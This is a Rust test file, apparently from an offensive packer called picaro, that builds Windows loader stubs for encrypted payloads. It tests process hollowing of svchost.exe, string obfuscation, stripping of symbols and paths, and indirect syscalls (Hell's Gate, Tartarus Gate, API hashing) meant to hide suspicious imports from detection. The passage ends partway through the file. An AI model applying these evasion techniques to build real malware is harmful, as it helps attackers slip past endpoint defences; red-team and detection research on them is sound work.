use super::*;

#[cfg(feature = "live-tests")]
use crate::plan::schema::PayloadFormat;
#[cfg(feature = "live-tests")]
use crate::techniques::{RuntimeStep, TechniqueKind};

#[test]
fn find_executable_in_empty_path_is_none() {
    assert!(find_executable_in_path(OsStr::new(""), RUSTC_NAMES).is_none());
}

#[test]
fn a_dll_build_unwinds_and_an_executable_aborts() {
    assert_eq!(panic_flag(OutputKind::Dll), "panic=unwind");
    assert_eq!(panic_flag(OutputKind::Exe), "panic=abort");
}

#[test]
fn shellcode_aborts_and_still_compiles_as_a_dll() {
    assert_eq!(panic_flag(OutputKind::Shellcode), "panic=abort");
    assert!(compiles_as_dll(OutputKind::Shellcode));
    assert!(compiles_as_dll(OutputKind::Dll));
    assert!(!compiles_as_dll(OutputKind::Exe));
}

#[test]
fn the_crate_name_follows_the_output_stem() {
    assert_eq!(crate_name(Path::new("picaro.dll")), "picaro");
    assert_eq!(crate_name(Path::new("/tmp/loader-x64.dll")), "loader_x64");
    // A Rust crate name may not start with a digit, and an empty stem needs
    // some name at all.
    assert_eq!(crate_name(Path::new("2fast.dll")), "_2fast");
    assert_eq!(crate_name(Path::new("")), "loader");
}

/// The stub target follows the requested architecture (and the host ABI on
/// Windows); off Windows it is always the GNU cross target.
#[test]
fn stub_target_follows_the_arch() {
    let x64 = stub_target(Arch::X64);
    let x86 = stub_target(Arch::X86);
    assert!(x64.starts_with("x86_64-pc-windows-"), "x64: {x64}");
    assert!(x86.starts_with("i686-pc-windows-"), "x86: {x86}");
    assert_ne!(x64, x86);
}

/// The `windows` import-lib crate name is per architecture: `windows_i686_*`
/// for x86, `windows_x86_64_*` for x64.
#[test]
fn windows_import_crate_is_per_arch() {
    assert!(windows_import_crate(Arch::X64).starts_with("windows_x86_64_"));
    assert!(windows_import_crate(Arch::X86).starts_with("windows_i686_"));
}

#[test]
fn rustc_missing_produces_clear_error() {
    let err = find_rustc_in(OsStr::new("")).expect_err("an empty PATH should fail");
    let msg = err.to_string();
    assert!(msg.contains("rustc"), "unclear error message: {msg}");
}

#[test]
fn rustc_version_reports_a_toolchain() {
    // `cargo test` cannot run without rustc, so this is not an extra
    // requirement; the manifest needs the same call to succeed.
    let version = rustc_version().expect("rustc --version should work");
    assert!(version.starts_with("rustc "), "unexpected: {version}");
}

/// `find_deps_dir_in` must locate `debug/deps` when the three rlibs are
/// present under a given target directory.
#[test]
fn finds_deps_dir_under_debug() {
    let tmp = std::env::temp_dir().join(format!("picaro_deps_{}", std::process::id()));
    let deps = tmp.join("debug").join("deps");
    std::fs::create_dir_all(&deps).unwrap();
    for crate_name in ["chacha20poly1305", "hex", "windows"] {
        std::fs::write(deps.join(format!("lib{crate_name}-deadbeef.rlib")), b"").unwrap();
    }

    let found = find_deps_dir_in(&tmp).expect("should locate debug/deps");
    assert!(found.ends_with("debug/deps"));

    let _ = std::fs::remove_dir_all(&tmp);
}

/// The per-arch crate version must be resolved through `windows`'s own
/// `windows-targets` dependency, not the first `windows_x86_64_*` entry — a
/// second `windows-targets` (e.g. from `windows-sys 0.48`) must not win.
#[test]
fn windows_crate_version_follows_the_windows_dependency_chain() {
    let lock = "\
[[package]]
name = \"windows\"
version = \"0.58.0\"
dependencies = [
 \"windows-core\",
 \"windows-targets 0.52.6\",
]

[[package]]
name = \"windows-targets\"
version = \"0.48.5\"
dependencies = [
 \"windows_x86_64_msvc 0.48.5\",
]

[[package]]
name = \"windows-targets\"
version = \"0.52.6\"
dependencies = [
 \"windows_x86_64_msvc 0.52.6\",
]
";

    let version = windows_crate_version_in(lock, "windows_x86_64_msvc")
        .expect("should resolve through windows -> windows-targets");
    assert_eq!(version, "0.52.6");
}

/// Extracts the `FROM=TO` pairs following each `--remap-path-prefix` flag.
fn remaps(flags: &[String]) -> Vec<&str> {
    flags
        .iter()
        .enumerate()
        .filter(|(_, f)| f.as_str() == "--remap-path-prefix")
        .filter_map(|(i, _)| flags.get(i + 1).map(String::as_str))
        .collect()
}

fn release_options(trim_paths: PathTrim) -> CompileOptions {
    CompileOptions {
        strip: true,
        trim_paths,
        debug: false,
        ..CompileOptions::default()
    }
}

#[test]
fn the_linker_timestamp_is_pinned() {
    let flags = reproducible_link_flags(Arch::X64);
    assert_eq!(flags[0], "-C");
    if target_is_msvc(Arch::X64) {
        assert_eq!(flags[1], "link-arg=/Brepro");
    } else {
        assert_eq!(flags[1], "link-arg=-Wl,--no-insert-timestamp");
    }
}

#[test]
fn stub_dir_is_remapped_when_outside_the_manifest_dir() {
    let flags = stub_dir_remap(
        release_options(PathTrim::All),
        Some(Path::new("/tmp/picaro-build")),
    );
    assert_eq!(remaps(&flags), vec!["/tmp/picaro-build=."]);
}

#[test]
fn stub_dir_remap_is_skipped_in_debug_and_for_trim_none() {
    let mut debug = release_options(PathTrim::All);
    debug.debug = true;
    assert!(stub_dir_remap(debug, Some(Path::new("/tmp/x"))).is_empty());

    let none = stub_dir_remap(release_options(PathTrim::None), Some(Path::new("/tmp/x")));
    assert!(none.is_empty());
}

#[test]
fn strip_flag_follows_the_option() {
    let manifest = Path::new("/proj");
    let stripped = hardening_flags(
        CompileOptions {
            strip: true,
            trim_paths: PathTrim::None,
            debug: false,
            ..CompileOptions::default()
        },
        manifest,
        None,
    );
    assert!(stripped.contains(&"strip=symbols".to_string()));

    let kept = hardening_flags(
        CompileOptions {
            strip: false,
            trim_paths: PathTrim::None,
            debug: false,
            ..CompileOptions::default()
        },
        manifest,
        None,
    );
    assert!(kept.contains(&"strip=none".to_string()));
    assert!(!kept.contains(&"strip=symbols".to_string()));
}

#[test]
fn trim_paths_none_emits_no_remap() {
    let flags = hardening_flags(
        CompileOptions {
            strip: true,
            trim_paths: PathTrim::None,
            debug: false,
            ..CompileOptions::default()
        },
        Path::new("/proj"),
        Some(Path::new("/home/dev")),
    );
    assert!(remaps(&flags).is_empty(), "flags: {flags:?}");
}

#[test]
fn trim_paths_relative_remaps_only_the_manifest_dir() {
    let flags = hardening_flags(
        CompileOptions {
            strip: true,
            trim_paths: PathTrim::Relative,
            debug: false,
            ..CompileOptions::default()
        },
        Path::new("/proj"),
        Some(Path::new("/home/dev")),
    );
    assert_eq!(remaps(&flags), vec!["/proj=."]);
}

#[test]
fn trim_paths_all_also_scrubs_the_cargo_home() {
    let flags = hardening_flags(
        CompileOptions {
            strip: true,
            trim_paths: PathTrim::All,
            debug: false,
            ..CompileOptions::default()
        },
        Path::new("/proj"),
        Some(Path::new("/home/dev/.cargo")),
    );
    assert_eq!(remaps(&flags), vec!["/proj=.", "/home/dev/.cargo=."]);
}

#[test]
fn trim_paths_all_tolerates_a_missing_cargo_home() {
    let flags = hardening_flags(
        CompileOptions {
            strip: true,
            trim_paths: PathTrim::All,
            debug: false,
            ..CompileOptions::default()
        },
        Path::new("/proj"),
        None,
    );
    assert_eq!(remaps(&flags), vec!["/proj=."]);
}

/// A debug build keeps the symbols, the debug info and the real source
/// paths, and drops the optimizer: that is the whole point of the mode.
#[test]
fn debug_flags_drop_the_hardening() {
    let flags = hardening_flags(
        CompileOptions {
            strip: true,
            trim_paths: PathTrim::All,
            debug: true,
            ..CompileOptions::default()
        },
        Path::new("/proj"),
        Some(Path::new("/home/dev/.cargo")),
    );
    assert!(flags.contains(&"opt-level=0".to_string()));
    assert!(flags.contains(&"debuginfo=2".to_string()));
    assert!(flags.contains(&"strip=none".to_string()));
    assert!(flags.contains(&"debug-assertions=on".to_string()));
    assert!(flags.contains(&"overflow-checks=on".to_string()));
    assert!(!flags.contains(&"strip=symbols".to_string()));
    assert!(!flags.contains(&"-O".to_string()));
    // Paths are kept so a debugger can open the generated stub.
    assert!(remaps(&flags).is_empty(), "flags: {flags:?}");
}

/// A release build optimizes for size: the smallest opt level and no
/// assertion/overflow machinery. `codegen-units=1` (set in `compile_stub`)
/// and `strip=symbols` finish the job.
#[test]
fn release_build_optimizes_for_size() {
    let flags = hardening_flags(
        CompileOptions {
            strip: true,
            trim_paths: PathTrim::None,
            debug: false,
            ..CompileOptions::default()
        },
        Path::new("/proj"),
        None,
    );
    assert!(
        flags.contains(&"opt-level=z".to_string()),
        "flags: {flags:?}"
    );
    assert!(flags.contains(&"debug-assertions=off".to_string()));
    assert!(flags.contains(&"overflow-checks=off".to_string()));
    assert!(flags.contains(&"strip=symbols".to_string()));
    assert!(!flags.contains(&"-O".to_string()));
    assert!(!flags.contains(&"opt-level=0".to_string()));
}

/// `strip: true` also drops the linker's debug directory on MSVC, where
/// `strip=symbols` alone leaves an RSDS record pointing at a PDB; the GNU
/// linker does not take the flag, and a debug or unstripped build keeps the
/// record on purpose.
#[test]
fn stripping_drops_the_msvc_debug_directory() {
    let flag = "link-arg=/DEBUG:NONE".to_string();
    let stripped = hardening_flags(CompileOptions::default(), Path::new("/proj"), None);
    let unstripped = hardening_flags(
        CompileOptions {
            strip: false,
            ..CompileOptions::default()
        },
        Path::new("/proj"),
        None,
    );
    if target_is_msvc(Arch::X64) {
        assert!(stripped.contains(&flag), "flags: {stripped:?}");
    } else {
        assert!(!stripped.contains(&flag), "flags: {stripped:?}");
    }
    assert!(!unstripped.contains(&flag), "flags: {unstripped:?}");
}

/// `build.polymorphism` reaches the flags through `CompileOptions`:
/// `opt-level` and `lto` here, `codegen-units` in `compile_stub`. It is a
/// parameter, not a global, so the same source compiles with different
/// profiles.
#[test]
fn the_codegen_profile_shapes_the_flags() {
    use crate::engine::polymorphism::{CodegenProfile, LtoMode, OptLevel};

    let flags = hardening_flags(
        CompileOptions {
            codegen: CodegenProfile {
                codegen_units: 4,
                opt_level: OptLevel::S,
                lto: LtoMode::Thin,
                inline_threshold: Some(25),
                mir_opt_level: Some(3),
                randomize_layout: true,
                layout_seed: 42,
            },
            ..CompileOptions::default()
        },
        Path::new("/proj"),
        None,
    );
    assert!(
        flags.contains(&"opt-level=s".to_string()),
        "flags: {flags:?}"
    );
    assert!(flags.contains(&"lto=thin".to_string()), "flags: {flags:?}");
    assert!(
        flags.contains(&"llvm-args=--inline-threshold=25".to_string()),
        "flags: {flags:?}"
    );
    assert!(
        flags.contains(&"mir-opt-level=3".to_string()),
        "flags: {flags:?}"
    );
    assert!(
        flags.contains(&"randomize-layout".to_string()),
        "flags: {flags:?}"
    );
    assert!(
        flags.contains(&"layout-seed=42".to_string()),
        "flags: {flags:?}"
    );
    assert!(!flags.contains(&"opt-level=z".to_string()));
}

/// The baseline profile emits no `lto` flag and keeps `opt-level=z`, so the
/// release flags are byte-for-byte the previous ones when polymorphism is
/// off or its seed lands on the baseline.
#[test]
fn the_default_profile_emits_the_previous_release_flags() {
    let flags = hardening_flags(CompileOptions::default(), Path::new("/proj"), None);
    assert!(flags.contains(&"opt-level=z".to_string()));
    assert!(!flags.iter().any(|flag| flag.starts_with("lto=")));
    assert!(!flags.iter().any(|flag| flag.starts_with("llvm-args=")));
    assert!(!flags.contains(&"randomize-layout".to_string()));
    assert!(!flags.iter().any(|flag| flag.starts_with("mir-opt-level=")));
}

/// Full packing flow with a 1 KB payload.
///
/// Marked `#[ignore]` because it requires `rustc` and the already-compiled
/// dependencies. On Windows that is `cargo build`; on Linux/WSL it also
/// requires `cargo build --target x86_64-pc-windows-gnu`. Run it with:
/// `cargo test --features live-tests -- --ignored`.
#[test]
#[cfg(feature = "live-tests")]
#[ignore = "requires rustc and the compiled dependencies"]
fn full_pipeline_generates_exe() {
    let plaintext: Vec<u8> = (0..1024u32).map(|i| (i % 251) as u8).collect();
    let key = crate::engine::crypto::generate_key();
    let encrypted = crate::engine::crypto::encrypt_payload(&plaintext, &key).unwrap();

    let build_dir = std::env::temp_dir().join(format!("picaro_it_{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&build_dir);
    std::fs::create_dir_all(&build_dir).unwrap();

    std::fs::write(build_dir.join("payload.bin"), &encrypted.ciphertext).unwrap();

    let tpl_path = Path::new(env!("CARGO_MANIFEST_DIR"))
        .join("src")
        .join("engine")
        .join("templates")
        .join("main.rs.tpl");
    let template = std::fs::read_to_string(tpl_path).unwrap();
    let pipeline = vec![RuntimeStep::new(TechniqueKind::ProcessHollowing {
        params: crate::techniques::process_hollowing::Params {
            payload: None,
            target: r"C:\Windows\System32\svchost.exe".to_string(),
        },
    })];
    let params = crate::engine::steps::test_params(
        &pipeline,
        &encrypted,
        "payload.bin",
        PayloadFormat::Pe,
        None,
        false,
    );
    let strings = crate::engine::obfuscation::StringsConfig::from_yaml(None).unwrap();
    let syscalls = crate::engine::syscalls::SyscallsConfig::default();
    let stub_src = crate::engine::steps::render_builtin(
        &template,
        &params,
        &strings,
        &syscalls,
        &crate::engine::api_resolution::ApiResolutionConfig::default(),
    )
    .unwrap();
    let stub_path = build_dir.join("main.rs");
    std::fs::write(&stub_path, stub_src).unwrap();

    let deps = locate_stub_deps(Arch::X64).unwrap();
    let out = build_dir.join("out.exe");
    compile_stub(&stub_path, &out, &deps, CompileOptions::default()).unwrap();

    let meta = std::fs::metadata(&out).unwrap();
    assert!(
        meta.len() > 0,
        "out.exe must exist and be larger than 0 bytes"
    );

    let _ = std::fs::remove_dir_all(&build_dir);
}

/// Compiles the stub with each string-obfuscation strategy and checks that
/// the sensitive literals (marker and hollowing target) never appear in
/// cleartext in the resulting PE.
///
/// This is the real end-to-end validation of the feature. Marked
/// `#[ignore]` for the same reasons as `full_pipeline_generates_exe`.
#[test]
#[cfg(feature = "live-tests")]
#[ignore = "requires rustc and the compiled dependencies"]
fn obfuscated_strings_absent_from_binary() {
    use crate::engine::obfuscation::{StringStrategy, StringsConfig};

    let plaintext: Vec<u8> = (0..1024u32).map(|i| (i % 251) as u8).collect();
    let key = crate::engine::crypto::generate_key();
    let encrypted = crate::engine::crypto::encrypt_payload(&plaintext, &key).unwrap();

    let build_dir = std::env::temp_dir().join(format!("picaro_str_{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&build_dir);
    std::fs::create_dir_all(&build_dir).unwrap();
    std::fs::write(build_dir.join("payload.bin"), &encrypted.ciphertext).unwrap();

    let template = std::fs::read_to_string(
        Path::new(env!("CARGO_MANIFEST_DIR"))
            .join("src")
            .join("engine")
            .join("templates")
            .join("main.rs.tpl"),
    )
    .unwrap();

    let deps = locate_stub_deps(Arch::X64).unwrap();

    let target = r"C:\Windows\System32\svchost.exe".to_string();

    let strategies = [
        (
            "xor",
            StringsConfig {
                strategy: StringStrategy::Xor,
                key: Some([0x5Au8; 32]),
            },
        ),
        (
            "stack",
            StringsConfig {
                strategy: StringStrategy::Stack,
                key: None,
            },
        ),
    ];

    for (name, strings) in strategies {
        let pipeline = vec![RuntimeStep::new(TechniqueKind::ProcessHollowing {
            params: crate::techniques::process_hollowing::Params {
                payload: None,
                target: target.clone(),
            },
        })];
        let params = crate::engine::steps::test_params(
            &pipeline,
            &encrypted,
            "payload.bin",
            PayloadFormat::Pe,
            None,
            false,
        );
        let stub_src = crate::engine::steps::render_builtin(
            &template,
            &params,
            &strings,
            &crate::engine::syscalls::SyscallsConfig::default(),
            &crate::engine::api_resolution::ApiResolutionConfig::default(),
        )
        .unwrap();
        let stub_path = build_dir.join(format!("main_{name}.rs"));
        std::fs::write(&stub_path, stub_src).unwrap();

        let out = build_dir.join(format!("out_{name}.exe"));
        compile_stub(&stub_path, &out, &deps, CompileOptions::default()).unwrap();

        let binary = std::fs::read(&out).unwrap();
        assert!(
            !binary.windows(target.len()).any(|w| w == target.as_bytes()),
            "{name}: hollowing target leaked into the binary"
        );
    }

    let _ = std::fs::remove_dir_all(&build_dir);
}

/// Compiles a stub for each registered technique and asserts that no
/// sensitive string literal (AMSI/ETW/DLL names, paths, technique keywords)
/// appears in cleartext in the resulting PE's code/data sections.
///
/// This is the safety net that stops a new technique fragment from
/// introducing a cleartext literal. Marked `#[ignore]` because it compiles
/// one stub per technique. Run it with `cargo test --features live-tests -- --ignored`.
#[test]
#[cfg(feature = "live-tests")]
#[ignore = "requires rustc and the compiled dependencies"]
fn no_sensitive_literals_in_generated_stubs() {
    use crate::audit::{pe_info, strings};
    use crate::techniques::{Category, RuntimeStep};

    let plaintext: Vec<u8> = (0..1024u32).map(|i| (i % 251) as u8).collect();
    let key = crate::engine::crypto::generate_key();
    let encrypted = crate::engine::crypto::encrypt_payload(&plaintext, &key).unwrap();

    let build_dir = std::env::temp_dir().join(format!("picaro_leak_{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&build_dir);
    std::fs::create_dir_all(&build_dir).unwrap();
    std::fs::write(build_dir.join("payload.bin"), &encrypted.ciphertext).unwrap();

    let template = std::fs::read_to_string(
        Path::new(env!("CARGO_MANIFEST_DIR"))
            .join("src")
            .join("engine")
            .join("templates")
            .join("main.rs.tpl"),
    )
    .unwrap();

    let deps = locate_stub_deps(Arch::X64).unwrap();
    let strings = crate::engine::obfuscation::StringsConfig::from_yaml(None).unwrap();

    for def in crate::techniques::all() {
        let step: RuntimeStep = serde_yml::from_str(def.params_example)
            .unwrap_or_else(|e| panic!("{} params_example does not parse: {e}", def.name));

        // A Preparation technique needs an Execution technique so the stub
        // compiles; `reflective_loading` is used as the filler.
        let pipeline = if def.category == Category::Preparation {
            let execution: RuntimeStep =
                serde_yml::from_str("technique: reflective_loading\n").unwrap();
            vec![step, execution]
        } else {
            vec![step]
        };

        let params = crate::engine::steps::test_params(
            &pipeline,
            &encrypted,
            "payload.bin",
            PayloadFormat::Pe,
            None,
            false,
        );
        let stub_src = crate::engine::steps::render_builtin(
            &template,
            &params,
            &strings,
            &crate::engine::syscalls::SyscallsConfig::default(),
            &crate::engine::api_resolution::ApiResolutionConfig::default(),
        )
        .unwrap();
        let stub_path = build_dir.join(format!("main_{}.rs", def.name));
        std::fs::write(&stub_path, &stub_src).unwrap();

        let out = build_dir.join(format!("out_{}.exe", def.name));
        compile_stub(&stub_path, &out, &deps, CompileOptions::default()).unwrap();

        let binary = std::fs::read(&out).unwrap();
        let pe = pe_info::analyze(&binary).unwrap();
        let code = pe_info::code_data(&binary, &pe.sections, &pe.import_text_ranges);
        // A hit in the binary alone is not proof of a leak: the `windows`
        // crate graph embeds `ntdll.dll` (via `windows-result`'s
        // `hresult.rs`) and the import table carries every imported DLL
        // name, none of which the packer controls. Only a literal that is
        // *also* present in the generated stub source — which is entirely
        // ours — is a real fragment leak.
        let in_source = strings::find_sensitive_literals_in_source(&stub_src);
        let leaked: Vec<String> = strings::find_sensitive_literals(&code)
            .into_iter()
            .filter(|lit| in_source.contains(lit))
            .collect();
        assert!(
                leaked.is_empty(),
                "technique '{}' leaks sensitive literals into the generated stub: {:?}. Route them through StringsConfig.",
                def.name,
                leaked
            );
    }

    let _ = std::fs::remove_dir_all(&build_dir);
}

/// Compiles `examples/stubs/minimal.rs` (a custom loader stub) and checks
/// it produces a PE. Marked `#[ignore]` because it needs `rustc` and the
/// compiled dependencies.
#[test]
#[cfg(feature = "live-tests")]
#[ignore = "requires rustc and the compiled dependencies"]
fn custom_stub_compiles_to_pe() {
    let template = std::fs::read_to_string(
        Path::new(env!("CARGO_MANIFEST_DIR"))
            .join("examples")
            .join("stubs")
            .join("minimal.rs"),
    )
    .unwrap();

    let params = crate::engine::steps::test_params(
        &[],
        &crate::engine::crypto::EncryptedPayload {
            nonce: [0u8; 24],
            key: [0u8; 32],
            ciphertext: vec![0xAA, 0xBB, 0xCC, 0xDD],
            plaintext_len: 4,
        },
        "payload.bin",
        PayloadFormat::Pe,
        None,
        false,
    );
    let strings = crate::engine::obfuscation::StringsConfig::from_yaml(None).unwrap();
    let rendered = crate::engine::steps::render_custom(
        &template,
        &params,
        &strings,
        &crate::engine::syscalls::SyscallsConfig::default(),
        &crate::engine::api_resolution::ApiResolutionConfig::default(),
    )
    .unwrap();
    assert!(rendered.warnings.is_empty(), "no techniques declared");

    let build_dir = std::env::temp_dir().join(format!("picaro_custom_{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&build_dir);
    std::fs::create_dir_all(&build_dir).unwrap();
    let stub_path = build_dir.join("main.rs");
    std::fs::write(&stub_path, &rendered.source).unwrap();

    let deps = locate_stub_deps(Arch::X64).unwrap();
    let out = build_dir.join("out.exe");
    compile_stub(&stub_path, &out, &deps, CompileOptions::default()).unwrap();

    let bytes = std::fs::read(&out).unwrap();
    assert_eq!(&bytes[..2], b"MZ", "custom stub must compile to a PE");

    let _ = std::fs::remove_dir_all(&build_dir);
}

// --- indirect syscalls (phase 6a) ---

/// Builds a process-hollowing stub with the given syscall plan, writing
/// `payload.bin` and the rendered stub into `build_dir`. Returns the path
/// of the compiled exe. `payload` is the plaintext to pack.
#[cfg(feature = "live-tests")]
fn build_hollowing_exe(
    build_dir: &Path,
    name: &str,
    syscalls: &crate::engine::syscalls::SyscallsConfig,
    payload: &[u8],
) -> PathBuf {
    let key = crate::engine::crypto::generate_key();
    let encrypted = crate::engine::crypto::encrypt_payload(payload, &key).unwrap();
    std::fs::write(build_dir.join("payload.bin"), &encrypted.ciphertext).unwrap();

    let template = std::fs::read_to_string(
        Path::new(env!("CARGO_MANIFEST_DIR"))
            .join("src")
            .join("engine")
            .join("templates")
            .join("main.rs.tpl"),
    )
    .unwrap();
    let pipeline = vec![RuntimeStep::new(TechniqueKind::ProcessHollowing {
        params: crate::techniques::process_hollowing::Params {
            payload: None,
            target: r"C:\Windows\System32\svchost.exe".to_string(),
        },
    })];
    let params = crate::engine::steps::test_params(
        &pipeline,
        &encrypted,
        "payload.bin",
        PayloadFormat::Pe,
        None,
        false,
    );
    let strings = crate::engine::obfuscation::StringsConfig::from_yaml(None).unwrap();
    let stub_src = crate::engine::steps::render_builtin(
        &template,
        &params,
        &strings,
        syscalls,
        &crate::engine::api_resolution::ApiResolutionConfig::default(),
    )
    .unwrap();
    let stub_path = build_dir.join(format!("main_{name}.rs"));
    std::fs::write(&stub_path, stub_src).unwrap();

    let deps = locate_stub_deps(Arch::X64).unwrap();
    let out = build_dir.join(format!("out_{name}.exe"));
    compile_stub(&stub_path, &out, &deps, CompileOptions::default()).unwrap();
    out
}

/// Builds the hollowing stub in both syscall modes and asserts the IAT
/// effect of `mode: indirect`: the four suspicious Win32 imports
/// (VirtualAllocEx, WriteProcessMemory, ReadProcessMemory, ResumeThread)
/// disappear, the NT names never appear in cleartext, and the output is
/// still a PE. Marked `#[ignore]` because it compiles two stubs.
#[test]
#[cfg(feature = "live-tests")]
#[ignore = "requires rustc and the compiled dependencies"]
fn indirect_syscalls_remove_the_suspicious_imports() {
    use crate::audit::pe_info::{self, ImportItem};

    let build_dir = std::env::temp_dir().join(format!("picaro_syscalls_{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&build_dir);
    std::fs::create_dir_all(&build_dir).unwrap();

    // This test only inspects the compiled binary, so the payload content
    // is irrelevant.
    let plaintext: Vec<u8> = (0..1024u32).map(|i| (i % 251) as u8).collect();

    let modes = [
        ("none", crate::engine::syscalls::SyscallsConfig::default()),
        (
            "indirect",
            crate::engine::syscalls::SyscallsConfig {
                mode: crate::engine::syscalls::SyscallsMode::Indirect,
                resolver: crate::engine::syscalls::Resolver::HellsGate,
                ..Default::default()
            },
        ),
    ];

    for (name, syscalls) in modes {
        let out = build_hollowing_exe(&build_dir, name, &syscalls, &plaintext);
        let binary = std::fs::read(&out).unwrap();
        assert_eq!(&binary[..2], b"MZ", "{name}: the stub must compile to a PE");

        let pe = pe_info::analyze(&binary).unwrap();
        let imported: Vec<String> = pe
            .imports
            .iter()
            .flat_map(|d| &d.functions)
            .filter_map(|f| match f {
                ImportItem::Named(n) => Some(n.clone()),
                ImportItem::Ordinal(_) => None,
            })
            .collect();

        const SUSPICIOUS: &[&str] = &[
            "VirtualAllocEx",
            "WriteProcessMemory",
            "ReadProcessMemory",
            "ResumeThread",
        ];

        if name == "indirect" {
            for s in SUSPICIOUS {
                assert!(
                    !imported.iter().any(|n| n == s),
                    "indirect mode must not import {s}"
                );
            }
            // The NT names must not appear anywhere in the binary.
            for nt in [
                "NtAllocateVirtualMemory",
                "NtWriteVirtualMemory",
                "NtReadVirtualMemory",
                "NtResumeThread",
                "NtUnmapViewOfSection",
            ] {
                assert!(
                    !binary.windows(nt.len()).any(|w| w == nt.as_bytes()),
                    "indirect mode leaked cleartext {nt}"
                );
            }
            // The userland APIs the stub still uses stay imported.
            for kept in ["CreateProcessA", "LoadLibraryA", "GetProcAddress"] {
                assert!(
                    imported.iter().any(|n| n == kept),
                    "indirect mode should still import {kept}"
                );
            }
        } else {
            for s in SUSPICIOUS {
                assert!(
                    imported.iter().any(|n| n == s),
                    "none mode must keep importing {s} (baseline)"
                );
            }
        }
    }

    let _ = std::fs::remove_dir_all(&build_dir);
}

/// Builds the hollowing stub with `resolver: tartarus_gate` and asserts it
/// compiles to a PE and leaks no NT names in cleartext. Marked `#[ignore]`
/// because it compiles a stub.
#[test]
#[cfg(feature = "live-tests")]
#[ignore = "requires rustc and the compiled dependencies"]
fn tartarus_gate_stub_compiles_to_pe() {
    let build_dir = std::env::temp_dir().join(format!("picaro_tartarus_{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&build_dir);
    std::fs::create_dir_all(&build_dir).unwrap();

    let plaintext: Vec<u8> = (0..1024u32).map(|i| (i % 251) as u8).collect();
    let syscalls = crate::engine::syscalls::SyscallsConfig {
        mode: crate::engine::syscalls::SyscallsMode::Indirect,
        resolver: crate::engine::syscalls::Resolver::TartarusGate,
        ..Default::default()
    };
    let out = build_hollowing_exe(&build_dir, "tartarus", &syscalls, &plaintext);

    let binary = std::fs::read(&out).unwrap();
    assert_eq!(
        &binary[..2],
        b"MZ",
        "the tartarus stub must compile to a PE"
    );
    for nt in [
        "NtAllocateVirtualMemory",
        "NtWriteVirtualMemory",
        "NtReadVirtualMemory",
        "NtResumeThread",
        "NtUnmapViewOfSection",
        "NtProtectVirtualMemory",
        "NtSuspendThread",
    ] {
        assert!(
            !binary.windows(nt.len()).any(|w| w == nt.as_bytes()),
            "tartarus mode leaked cleartext {nt}"
        );
    }

    let _ = std::fs::remove_dir_all(&build_dir);
}

/// Builds the hollowing stub with `resolver: api_hash` and asserts it
/// compiles to a PE, leaks no NT names in cleartext, and emits no
/// `GetProcAddress`-based resolution. Marked `#[ignore]` because it
/// compiles a stub.
#[test]
#[cfg(feature = "live-tests")]
#[ignore = "requires rustc and the compiled dependencies"]
fn api_hash_stub_compiles_to_pe() {
    let build_dir = std::env::temp_dir().join(format!("picaro_api_hash_{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&build_dir);
    std::fs::create_dir_all(&build_dir).unwrap();

    let plaintext: Vec<u8> = (0..1024u32).map(|i| (i % 251) as u8).collect();
    let syscalls = crate::engine::syscalls::SyscallsConfig {
        mode: crate::engine::syscalls::SyscallsMode::Indirect,
        resolver: crate::engine::syscalls::Resolver::ApiHash,
        ..Default::default()
    };
    let out = build_hollowing_exe(&build_dir, "api_hash", &syscalls, &plaintext);

    let binary = std::fs::read(&out).unwrap();
    assert_eq!(
        &binary[..2],
        b"MZ",
        "the api_hash stub must compile to a PE"
    );
    for nt in [
        "NtAllocateVirtualMemory",
        "NtWriteVirtualMemory",
        "NtReadVirtualMemory",
        "NtResumeThread",
        "NtUnmapViewOfSection",
        "NtProtectVirtualMemory",
        "NtSuspendThread",
    ] {
        assert!(
            !binary.windows(nt.len()).any(|w| w == nt.as_bytes()),
            "api_hash mode leaked cleartext {nt}"
        );
    }

    let _ = std::fs::remove_dir_all(&build_dir);
}

/// Builds the hollowing stub with `mode: indirect` and runs the resulting
/// binary on a Windows host.
///
/// The stub exits `1` only when its own error path fires (decryption,
/// syscall resolution, or a failed nt_* call); so the assertion is that it
/// does NOT exit `1`. Any other outcome is accepted: the stub may relay the
/// hollowed process's exit code (process hollowing can crash the payload on
/// hardened hosts; that is a separate, pre-existing limitation and the
/// stub's syscall calls all returned success before the hand-off). The test
/// does not rely on the payload's output, which it prints to stdout.
///
/// Marked `#[ignore]`; it only does something on a Windows host.
#[test]
#[cfg(feature = "live-tests")]
#[ignore = "requires rustc, compiled deps and a Windows host with a desktop"]
fn indirect_syscalls_binary_runs_on_windows() {
    if !cfg!(windows) {
        return;
    }

    let build_dir = std::env::temp_dir().join(format!("picaro_run_{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&build_dir);
    std::fs::create_dir_all(&build_dir).unwrap();

    let syscalls = crate::engine::syscalls::SyscallsConfig {
        mode: crate::engine::syscalls::SyscallsMode::Indirect,
        resolver: crate::engine::syscalls::Resolver::HellsGate,
        ..Default::default()
    };
    // The real test payload (it prints a fixed marker), not the synthetic
    // bytes the compile-only tests use: this test actually runs the stub,
    // which parses and executes the payload.
    let payload = std::fs::read(
        Path::new(env!("CARGO_MANIFEST_DIR"))
            .join("examples")
            .join("payloads")
            .join("test_payload.exe"),
    )
    .unwrap();
    let out = build_hollowing_exe(&build_dir, "run", &syscalls, &payload);

    let mut child = std::process::Command::new(&out)
        .spawn()
        .expect("the exe must start");
    // Give the stub time to decrypt, resolve SSNs and hollow svchost.
    let deadline = std::time::Instant::now() + std::time::Duration::from_secs(10);
    loop {
        match child.try_wait() {
            Ok(Some(status)) => {
                assert_ne!(
                    status.code(),
                    Some(1),
                    "the stub failed through its own error path (syscall layer)"
                );
                break;
            }
            Ok(None) if std::time::Instant::now() >= deadline => {
                // Still alive: the stub is waiting on the hollowed process.
                let _ = child.kill();
                break;
            }
            Ok(None) => std::thread::sleep(std::time::Duration::from_millis(200)),
            Err(e) => panic!("could not check the packed exe: {e}"),
        }
    }

    let _ = std::fs::remove_dir_all(&build_dir);
}

/// Renders a custom stub template with a fresh key and a small payload.
///
/// The pipeline only drives the shared blocks (args/imports/syscalls); a
/// custom template that ignores `$STEP_MODULES$` never pulls in a technique
/// fragment, which is what lets the x86 toolchain be tested while every
/// fragment is still x64-only.
#[cfg(feature = "live-tests")]
